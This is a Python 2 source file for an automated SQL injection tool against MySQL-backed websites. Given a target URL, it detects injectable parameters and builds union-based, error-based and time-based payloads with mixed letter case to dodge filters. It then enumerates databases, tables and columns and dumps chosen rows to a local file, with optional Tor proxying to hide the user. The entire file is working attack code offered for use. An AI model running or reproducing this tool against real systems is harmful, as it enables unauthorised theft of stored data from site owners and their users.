import socket
import urllib2
import sys
import os
from threading import Thread
import time
import hashlib
import random
import re

ip = 1
dump_array = []
temp_array = {}
database_list = {}
table_list = {}
column_list = {}

syntax = ["you have an error in your sql syntax","check the manual that corresponds to you","warning: mysql_","supplied argument is not a valid mysql","to be resource, boolean given in"]
prefix = "  "
original = "..."
link = ""
is_int = "..."
types = ""
column_count = 0
column_vulnerable = 0
version = "1.1"

def clear():
	os.system('cls' if os.name == 'nt' else 'clear')
	print "         __  __      ___  ___  _       ___       _        _           "
	print "        |  \/  |_  _/ __|/ _ \| |     |_ _|_ _  (_)___ __| |_ ___ _ _ "
	print "        | |\/| | || \__ \ (_) | |__    | || ' \ | / -_) _|  _/ _ \ '_|"
	print "        |_|  |_|\_, |___/\__\_\____|  |___|_|\_|| \___\__|\__\___/_|  "
	print "                |___/                         \___/                v" + version
	print

proxy = 0
if proxy:
	import socks
	socks5_host = "127.0.0.1"
	socks5_port = 9050
	socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, socks5_host, socks5_port)
	socket.socket = socks.socksocket

def hex(input):
	input = str(input)
	return input.encode("hex")
	
def md5(xstr):
	return hashlib.md5(str(xstr)).hexdigest()

def save(table = ""):
	path = os.path.expanduser('~') + "/Desktop/" + table + ".txt"
	while 1:
		print
		try:
			handler = open(path, "w")
			for data in dump_array:
				handler.write(data + "\n")
			handler.close()
			print prefix + "Dump saved to: " + path
			print
			return
		except:
			print prefix + "[-] Error while saving dump .. "
			path = raw_input(prefix + "Enter other path to save dump: ")

def debug(text,filename):
	return
	path = os.path.expanduser('~') + "/Desktop/" + filename
	handler = open(path, "a")
	handler.write(text + "\n")
	handler.close()

def get_ip():
	try:
		if ip:
			ip_address = urllib2.urlopen("http://canihazip.com/s").read()
		else:
			ip_address = "127.0.0.1"
		print prefix + "Your IP Address: " + ip_address
	except Exception as e:
		print str(e)

def confirm_proxy():
	if proxy:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		result = s.connect_ex((socks5_host, socks5_port))
		s.close()
		if result > 0:
			print prefix + "Could not connect to proxy!"
			exit()
			
def get_link():
	global link
	tmp = raw_input(prefix + "Insert link: ")
	if not tmp:
		link = "http://127.0.0.1/sqli.php?id=11"
		return
	if not "http" in tmp:
		tmp = "http://" + tmp
	link = tmp
			
def obfuscate(xstr):
	output = ""
	xstr = xstr.replace(" ","%20")
	return xstr
	
def webrequest(link,wait=30):
	
	xlink = link.replace(" ","%20")

	try:
		request = urllib2.Request(xlink, headers={"User-Agent" : "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0"})
		contents = urllib2.urlopen(request,timeout=wait).read()
		debug(urllib2.unquote(xlink) + "\n","dump.txt")
		return contents
	except socket.timeout:
		return "time"
	except urllib2.HTTPError as e:
		return str(e)
	except Exception as e:
		return str(e)

def xcolumns(cols, vuln = 0,query = "x", nullcolumn = 0):
	if vuln == 1:
		payload = query
	else:
		if nullcolumn:
			payload = "0x" + hex(1) + " "
		else:
			payload = " 0x7e7e" + hex(1) + "7e7e "
	count = 2
	while count <= cols:
		if count == vuln:
			payload += " , " + query
			count += 1
		else:
			if nullcolumn:
				payload += ", 0x" + hex(count) + " "
			else:
				payload += ", 0x7e7e" + hex(count) + "7e7e "
			count += 1
	return payload

def check_int():
	global original
	original = webrequest(link)
	error = webrequest(link + obfuscate("'"))
	fix = webrequest(link + obfuscate("' and '1"))
	if md5(original) == md5(fix) and md5(original) != md5(error):
		return 0
	for error in syntax:
		if error in fix.lower():
			return 1
	if webrequest(link + obfuscate("' oR sleep( 10 ) --+"),9) == "time":
		return 0
	else:
		return 1

def scan_column(payload,offset = 0):
	global column_count
	global column_vulnerable
	xlink = link + obfuscate(payload)
	html = webrequest(xlink)
	if re.search("~~(.*?)~~", html):
		column_count = int(offset)
		column_vulnerable = int(re.search("~~(.*?)~~", html).groups()[0])
	return

def inject(payload1,payload2 = "",itype = 0,save = 0):

	html = ""
	
	#Union-Based Injection
	if itype == 1 or itype == 0 and "1" in types:
		if is_int:
			payload = " AnD 0 UNiON DiSTiNCTROW SeLeCT " + xcolumns(column_count,column_vulnerable,"CoNCaT( 0x7e7e , " + payload1 + " , 0x7e7e ) ",1) + payload2 + " --+"
		else:
			payload = "' AnD 0 UNiON DiSTiNCTROW SeLeCT " + xcolumns(column_count,column_vulnerable,"CoNCaT( 0x7e7e , " + payload1 + " , 0x7e7e ) ",1) + payload2 + " --+"
		xlink = link + obfuscate(payload)
		html = webrequest(xlink)
		
		if re.search("~~(.*?)~~", html):
			html = "~~" + re.search("~~(.*?)~~", html).groups()[0] + "~~"
		if save:
			if save in temp_array:
				temp_array[save] = str(temp_array[save]) + html
			else:
				temp_array[save] = html
		return html
		
	#Error-Based Injection
	if itype == 2 or itype == 0 and "2" in types:
		if is_int:
			payload = " oR ( SeLeCT CoUNT( * ) FRoM iNFORMaTiON_SCHeMa . TaBLeS GRouP By CoNCaT( 0x7e7e , ( SeLeCT " + payload1 + " " + payload2 + " ) , 0x7e7e , flOOr( rAND( ) * 50 ) ) ) --+"
		else:
			payload = "' oR ( SeLeCT CoUNT( * ) FRoM iNFORMaTiON_SCHeMa . TaBLeS GRouP By CoNCaT( 0x7e7e , ( SeLeCT " + payload1 + " " + payload2 + " ) , 0x7e7e , flOOr( rAND( ) * 50 ) ) ) --+"
		xlink = link + obfuscate(payload)
		html = webrequest(xlink)
		html = html.replace("\n","")
		if re.search("~~(.*?)~~", html):
			html = "~~" + re.search("~~(.*?)~~", html).groups()[0] + "~~"
		if save:
			if save in temp_array:
				temp_array[save] = str(temp_array[save]) + html
			else:
				temp_array[save] = html
		return html
	
def check_union():
	global column_count
	global column_vulnerable
	#Checking Union
	#Columns 1
	if is_int:
		html = webrequest(link + obfuscate(" GRouP By 1 , 2 , 3 , 4 , 5 , 6 , 7 , 8 , 9 , 10 , 11 , 12 , 13 , 14 , 15 , 16 , 17 , 18 , 19 , 20 , 21 , 22 , 23 , 24 , 25 , 26 , 27 , 28 , 29 , 30 , 31 , 32 , 33 , 34 , 35 , 36 , 37 , 38 , 39 , 40 , 41 , 42 , 43 , 44 , 45 , 46 , 47 , 48 , 49 , 50 , 51 , 52 , 53 , 54 , 55 , 56 , 57 , 58 , 59 , 60 , 61 , 62 , 63 , 64 , 65 , 66 , 67 , 68 , 69 , 70 , 71 , 72 , 73 , 74 , 75 , 76 , 77 , 78 , 79 , 80 , 81 , 82 , 83 , 84 , 85 , 86 , 87 , 88 , 89 , 90 , 91 , 92 , 93 , 94 , 95 , 96 , 97 , 98 , 99 , 100 --+"))
	else:
		html = webrequest(link + obfuscate("' GRouP By 1 , 2 , 3 , 4 , 5 , 6 , 7 , 8 , 9 , 10 , 11 , 12 , 13 , 14 , 15 , 16 , 17 , 18 , 19 , 20 , 21 , 22 , 23 , 24 , 25 , 26 , 27 , 28 , 29 , 30 , 31 , 32 , 33 , 34 , 35 , 36 , 37 , 38 , 39 , 40 , 41 , 42 , 43 , 44 , 45 , 46 , 47 , 48 , 49 , 50 , 51 , 52 , 53 , 54 , 55 , 56 , 57 , 58 , 59 , 60 , 61 , 62 , 63 , 64 , 65 , 66 , 67 , 68 , 69 , 70 , 71 , 72 , 73 , 74 , 75 , 76 , 77 , 78 , 79 , 80 , 81 , 82 , 83 , 84 , 85 , 86 , 87 , 88 , 89 , 90 , 91 , 92 , 93 , 94 , 95 , 96 , 97 , 98 , 99 , 100 --+"))
	if re.search("unknown column '(.*?)'",html.lower()):
		try:
			column_count = int(re.search("unknown column '(.*?)'", html.lower()).groups()[0]) - 1
			if is_int:
				payload = " AnD 0 UNiON DiSTiNCTRoW SeLeCT " + xcolumns(column_count) + " --+"
			else:
				payload = "' AnD 0 UNiON DiSTiNCTRoW SeLeCT " + xcolumns(column_count) + " --+"
				
			vulnerable = webrequest(link + obfuscate(payload))
			column_vulnerable = int(re.search("~~(.*?)~~", vulnerable).groups()[0])
			return 1
		except:
			pass
	else:
	#Columns 2
		threads = 5
		threads_running = 0
		thread_list = []
		for x in range(40):
			x += 1
			if is_int:
				payload = obfuscate(" AnD 0 UNiON DiSTiNCTRoW SeLeCT " + xcolumns(x) + " --+")
			else:
				payload = obfuscate("' AnD 0 UNiON DiSTiNCTRoW SeLeCT " + xcolumns(x) + " --+")
			thread = Thread(target=scan_column, args=(payload,x))
			thread_list.append(thread)
			
		for thread in thread_list:
			if threads_running < threads:
				thread.start()
				threads_running += 1
			else:
				#print prefix + "Waiting"
				for running_thread in thread_list:
					if running_thread.isAlive():
						running_thread.join()
				if column_count and column_vulnerable:
					return 1
						
				thread.start()
				threads_running = 1
		
		for running_thread in thread_list:
			if running_thread.isAlive():
				running_thread.join()
		if column_count and column_vulnerable:
			return 1
	return 0

def check_error():
	html = inject("0x76756c6e657261626c65","",2)
	if re.search("~~(.*?)~~", html):
		if re.search("~~(.*?)~~", html).groups()[0] == "vulnerable":
			return 1
	return 0
	
def check_type():
	global types
	
	#Test Union
	if check_union():
		types += "1"
		print prefix + "[+] Vulnerable: Union-Based Injection (" + str(column_vulnerable) + "/" + str(column_count) + ")"
	else:
		print prefix + "[-] Failed: Union-Based Injection"
	
	#Test Error
	if check_error():
		types += "2"
		print prefix + "[+] Vulnerable: Error-Based Injection"
	else:
		print prefix + "[-] Failed: Error-Based Injection"

def temp_clear():
	temp_array.clear()
	
def get_info():
	threads = 5
	threads_running = 0
	thread_list = []
	
	thread_list.append(Thread(target=inject, args=("database()","",0,1)))
	thread_list.append(Thread(target=inject, args=("version()","",0,2)))
	thread_list.append(Thread(target=inject, args=("SuBSTRiNG_iNDEX( user(  ), 0x40 , 1 )","",0,3)))
	thread_list.append(Thread(target=inject, args=("FiLE_PRiV","FRoM mysql . user WHeRe uSeR = SuBSTRiNG_iNDEX( user(  ), 0x40 , 1 )",0,4)))
	thread_list.append(Thread(target=inject, args=("count(*)","FRoM information_schema . tables WHeRe TaBLe_SCHeMa = database()",0,5)))
	
	
	for thread in thread_list:
		thread.start()

	for running_thread in thread_list:
		if running_thread.isAlive():
			running_thread.join()
	
	print
	
	if re.search("~~(.*?)~~",temp_array[1]):
		print prefix + "[i] DB Name:   " + re.search("~~(.*?)~~", temp_array[1]).groups()[0]
	else:
		print prefix + "[-] DB Name:   Failed"
		
	if re.search("~~(.*?)~~",temp_array[2]):
		print prefix + "[i] Version:   " + re.search("~~(.*?)~~", temp_array[2]).groups()[0]
	else:
		print prefix + "[-] Version:   Failed"
	
	if re.search("~~(.*?)~~",temp_array[3]):
		print prefix + "[i] Username:  " + re.search("~~(.*?)~~", temp_array[3]).groups()[0]
	else:
		print prefix + "[-] Username:  Failed"
	
	if re.search("~~(.*?)~~",temp_array[4]):
		print prefix + "[i] File_Priv: " + re.search("~~(.*?)~~", temp_array[4]).groups()[0]
	else:
		print prefix + "[-] File_Priv: Failed"
	
	if re.search("~~(.*?)~~",temp_array[5]):
		print prefix + "[i] Tables:    " + re.search("~~(.*?)~~", temp_array[5]).groups()[0]
	else:
		print prefix + "[-] Tables:    Failed"
	
	temp_clear()
	
	print

def get_databases():
	
	clear()
	
	if not database_list:
		temp = inject("count(*)","from information_schema . schemata")
		count = 0
		if re.search("~~(.*?)~~", temp):
			count = int(re.search("~~(.*?)~~", temp).groups()[0])
			print prefix + "[i] Gathering database names (" +  str(len(temp_array)) + "/" + str(count) + ")"
		else:
			print prefix + "[-] Could not get databases, exiting .. "
			print
			exit()
		print
		
		threads = 5
		threads_running = 0
		thread_list = []
		
		for db in range(1,count + 1):
			thread = Thread(target=inject, args=("schema_name"," from information_schema . schemata limit " + str(db - 1) + " , 1 ",0,db))
			thread_list.append(thread)
		
		for thread in thread_list:
			if threads_running < threads:
				thread.start()
				threads_running += 1
			else:
				for running_thread in thread_list:
					if running_thread.isAlive():
						running_thread.join()
				clear()
				print prefix + "[i] Gathering database names (" +  str(len(temp_array)) + "/" + str(count) + ")"
				thread.start()
				threads_running = 1
				
		for running_thread in thread_list:
			if running_thread.isAlive():
				running_thread.join()
		
		count = 1
		if temp_array:
			clear()
			for key, value in temp_array.iteritems() :
				if re.search("~~(.*?)~~", value):
					database = re.search("~~(.*?)~~", value).groups()[0]
					database_list[count] = database
					print prefix + str(count) + "\t" + database
				count += 1
	else:
		for key, value in database_list.iteritems() :
			print prefix + str(key) + "\t" + value
	print
	temp_clear()
	
	get_tables(raw_input(prefix + "Insert database id to continue: "))

def get_tables(database_id):

	if not database_id:
		get_databases()
		return
	else:
		database_id = int(database_id)
		
	database = database_list[database_id]
	clear()
	
	if not database_id in table_list:
		table_list.clear()
		column_list.clear()
		table_list[database_id] = {}
		
		temp = inject("count(*)","from information_schema . tables where table_schema = 0x" + hex(database))
		count = 0
		if re.search("~~(.*?)~~", temp):
			count = int(re.search("~~(.*?)~~", temp).groups()[0])
			if count == 0:
				clear()
				raw_input(prefix + "No tables found, press enter to return .. ")
				get_databases()
				return
			
			print prefix + "[i] Gathering table names (" +  str(len(temp_array)) + "/" + str(count) + ")"
		else:
			print prefix + "[-] Could not get tables, exiting .. "
			print
			exit()
		print
		
		threads = 5
		threads_running = 0
		thread_list = []
		
		for db in range(1,count + 1):
			thread = Thread(target=inject, args=("table_name"," FRoM information_schema . tables WHeRe table_schema = 0x" + hex(database) + " limit " + str(db - 1) + " , 1 ",0,db))
			thread_list.append(thread)
		
		for thread in thread_list:
			if threads_running < threads:
				thread.start()
				threads_running += 1
			else:
				for running_thread in thread_list:
					if running_thread.isAlive():
						running_thread.join()
				clear()
				print prefix + "[i] Gathering table names (" +  str(len(temp_array)) + "/" + str(count) + ")"
				thread.start()
				threads_running = 1
				
		for running_thread in thread_list:
			if running_thread.isAlive():
				running_thread.join()
		
		count = 1
		if temp_array:
			clear()
			for key, value in temp_array.iteritems() :
				if re.search("~~(.*?)~~", value):
					table = re.search("~~(.*?)~~", value).groups()[0]
					table_list[database_id][count] = table
					print prefix + str(count) + "\t" + table_list[database_id][count]
				count += 1
	else:
		tables = table_list[database_id]
		for key, value in tables.iteritems():
			print prefix + str(key) + "\t" + value

	print
	temp_clear()
	get_columns(database_id)
	
def get_columns(database_id):
	
	table_id = raw_input(prefix + "Insert table id to continue: ")
	if not table_id:
		get_databases()
		return
	else:
		table_id = int(table_id)
	
	table = table_list[database_id][table_id]
	
	clear()
	
	if not table_id in column_list:
		column_list[table_id] = {}
		
		temp = inject("count(*)","from information_schema . columns where table_name = 0x" + hex(table) + " and table_schema = 0x" + hex(database_list[database_id]))
		count = 0
		if re.search("~~(.*?)~~", temp):
			count = int(re.search("~~(.*?)~~", temp).groups()[0])
			if count == 0:
				clear()
				raw_input(prefix + "No columns found, press enter to return .. ")
				get_databases(database_id)
				return
			print prefix + "[i] Gathering column names (" +  str(len(temp_array)) + "/" + str(count) + ")"
		else:
			print prefix + "[-] Could not get columns, exiting .. "
			print
			exit()
		print
		
		threads = 5
		threads_running = 0
		thread_list = []
		
		for x in range(1,count + 1):
			thread = Thread(target=inject, args=("column_name"," from information_schema . columns where table_name = 0x" + hex(table) + " limit " + str(x - 1) + " , 1 ",0,x))
			thread_list.append(thread)
		
		for thread in thread_list:
			if threads_running < threads:
				thread.start()
				threads_running += 1
			else:
				for running_thread in thread_list:
					if running_thread.isAlive():
						running_thread.join()
				clear()
				print prefix + "[i] Gathering column names (" +  str(len(temp_array)) + "/" + str(count) + ")"
				thread.start()
				threads_running = 1
				
		for running_thread in thread_list:
			if running_thread.isAlive():
				running_thread.join()
		
		count = 1
		if temp_array:
			clear()
			for key, value in temp_array.iteritems() :
				if re.search("~~(.*?)~~", value):
					column = re.search("~~(.*?)~~", value).groups()[0]
					column_list[table_id][count] = column
					print prefix + str(count) + "\t" + column_list[table_id][count]
				count += 1
	else:
		columns = column_list[table_id]
		for key, value in columns.iteritems():
			print prefix + str(key) + "\t" + value

	print
	temp_clear()
	
	column_ids = raw_input(prefix + "Insert column id's to dump: ")
	if not column_ids:
		get_tables(database_id)
		return
	else:
		column_names = []
		column_id_array = column_ids.replace(" ","").split(',');
		for column_id in column_id_array:
			column_id = int(column_id)
			column_names.append(column_list[table_id][column_id])
		
		column_names = column_names
		table_name = table
		database_name = database_list[database_id]
		
		dump(column_names,table_name,database_name,database_id)	

def dumper(column_names,database_name,table_name,x):
	
	data = ""
	html = ""
	
	if "1" in types:
		html = inject(",0x3a,".join(column_names)," from " + database_name + " . " + table_name + " limit " + str(x) + ",1")
		if re.search("~~(.*?)~~", html):
			data = re.search("~~(.*?)~~", html).groups()[0]
			
	if not "1" in types and "2" in types:
		for column in column_names:
			html += inject(column," from " + database_name + " . " + table_name + " limit " + str(x) + ",1")
		if re.search("~~(.*?)~~", html):
			temp = re.findall("~~(.*?)~~", html)
			data = ":".join(temp)
	if data:
		dump_array.append(data)
				

def dump(column_names,table_name,database_name,database_id):
	
	clear()

	temp = inject("count(*)","from " + database_name + " . " + table_name )
	count = 0
	if re.search("~~(.*?)~~", temp):
		count = int(re.search("~~(.*?)~~", temp).groups()[0])
		if count == 0:
			clear()
			raw_input(prefix + "No rows to dump, press enter to return .. ")
			get_tables(database_id)
			return
		print prefix + "[i] Dumping row: " + str(len(dump_array)) + "/" + str(count)
	else:
		print prefix + "[-] Could not get rows, exiting .. "
		print
		exit()
	print
		
	threads = 5
	threads_running = 0
	thread_list = []

	for x in range(count):
		thread = Thread(target=dumper, args=(column_names,database_name,table_name,x))	
		thread_list.append(thread)

	for thread in thread_list:
		if threads_running < threads:
			thread.start()
			threads_running += 1
		else:
			for running_thread in thread_list:
				if running_thread.isAlive():
					running_thread.join()
			clear()
			for item in dump_array:
				print prefix + item
			print
			print prefix + "[i] Dumping row: " + str(len(dump_array)) + "/" + str(count)
			
			thread.start()
			threads_running = 1
				
	for running_thread in thread_list:
		if running_thread.isAlive():
			running_thread.join()
	
	clear()
	for item in dump_array:
		print prefix + item

	save(table_name)
	raw_input(prefix + "Press enter to continue .. ")
	del dump_array[:]
	get_databases()
	
	
def main():
	global is_int
	clear()
	confirm_proxy()
	get_ip()
	get_link()
	clear()
	print prefix + "[i] Starting process .. "
	is_int = check_int()
	print prefix + "[i] Integer: " + str(is_int)
	check_type()
	if types:
		get_info()
	else:
		print prefix + "[-] Could not find vulnerabilities, exiting .. "
		print
		exit()
	raw_input(prefix + "Press enter to get databases .. ")
	get_databases()

main()